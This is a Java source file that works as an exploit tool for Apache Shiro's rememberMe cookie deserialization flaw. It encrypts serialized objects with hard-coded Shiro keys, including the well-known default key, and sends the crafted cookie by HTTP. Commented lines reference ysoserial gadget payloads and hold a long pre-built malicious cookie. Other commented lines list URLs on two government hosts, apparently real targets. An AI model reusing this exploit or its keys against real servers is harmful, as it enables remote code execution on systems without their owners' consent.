package summersec.shirodemo.Payload;


import cn.hutool.core.io.file.FileReader;
import cn.hutool.http.HttpRequest;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.subject.SimplePrincipalCollection;
import summersec.shirodemo.Encrypt.CbcEncrypt;
import summersec.shirodemo.Encrypt.GcmEncrypt;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;


/**
 * @ClassName: Payload
 * @Description: TODO
 * @Author: Summer
 * @Date: 2021/1/16 15:08
 * @Version: v1.0.0
 * @Description:
 *                  Gadget chian:
 *                      DefaultSecurityManager.resolvePrincipals()
 *                          DefaultSecurityManager.getRememberedIdentity()
 *                              AbstractRememberMeManager.getRememberedPrincipals()
 *                                  CookieRememberMeManager#getRememberedSerializedIdentity()
 *                                      AbstractRememberMeManager#getRememberedPrincipals()
 *                                          AbstractRememberMeManager.convertBytesToPrincipals()
 *                                              AbstractRememberMeManager.decrypt()
 *                                                  AbstractRememberMeManager.deserialize()
 *                                                      .....................
 *                                                               ..........
 *
 *
 **/
public class Payload {

    public static void main(String[] args) throws Exception {
        // shiro key
//        String key = "kPH+bIxk5D2deZiIxcaaaA==";
        String key = "4AvVhmFLUs0KTA3Kprsdag==";
        byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");

        // ysoserial.jar 路径
//        String ysoserial = "D:\\Tools\\反序列化\\ysoserial-0.0.6-SNAPSHOT-all.jar";
        // payload 生成文件路径
//        String filepath = "E:\\myself\\OneDrive - Colegio Público Torre Malmuerta\\Soures\\JavaLearnVulnerability\\shiro\\shiro-deser\\t.txt";
//        String filepath = "D:\\Tools\\反序列化\\1.ser";
        String filepath = "G:\\work\\1.ser";

        FileReader fileReader = new FileReader(filepath);
        SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();
        ByteArrayOutputStream bao = new ByteArrayOutputStream();
        try (ObjectOutputStream objectOutputStream = new ObjectOutputStream(bao)) {
          objectOutputStream.writeObject(simplePrincipalCollection);
          objectOutputStream.flush();
        }
        byte[] bytes = bao.toByteArray();
//


        //  aes cbc加密
        CbcEncrypt cbcEncrypt = new CbcEncrypt();
        GcmEncrypt gcmEncrypt = new GcmEncrypt();
        // payload cookie
        // 使用 cbcEncrypt 进行加密
        String cookie = "";
         cookie = "rememberMe=" + cbcEncrypt.encrypt(key,bytes);
         cookie += "; rememberMe=" + cbcEncrypt.encrypt(key,bytes);
//        cookie += "; rememberMe=" + "";
//        cookie += "; rememberMe=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" ;
//         cookie += "; rememberMe=" + cbcEncrypt.encrypt(key,fileReader.readBytes());
//        cookie += "; rememberMe=" + cbcEncrypt.encrypt(key,bytes);
//        String cookie = "rememberMe=" + gcmEncrypt.encrypt(key,fileReader.readBytes());
//        String cookie = "rememberMe=" + gcmEncrypt.encrypt(key,bytes);
//     使用 Encrypt 进行加密

//        String cookie = "rememberMe=" + Encrypt.encrypt(fileReader.readBytes(),DEFAULT_CIPHER_KEY_BYTES);

        System.out.println(cookie);
//        String url = "http://sz.yunfu.gov.cn:9528/host.html";
//        String url = "http://zfgjjwt.meizhou.gov.cn:7005/netface/login.do";
        String url = "http://127.0.0.1:8090/index";
        String result = HttpRequest.get(url).cookie(cookie)
                .setHttpProxy("127.0.0.1",8080).execute().toString();
//                .execute().toString();
        System.out.println(result);
//        System.out.println();



    }


}
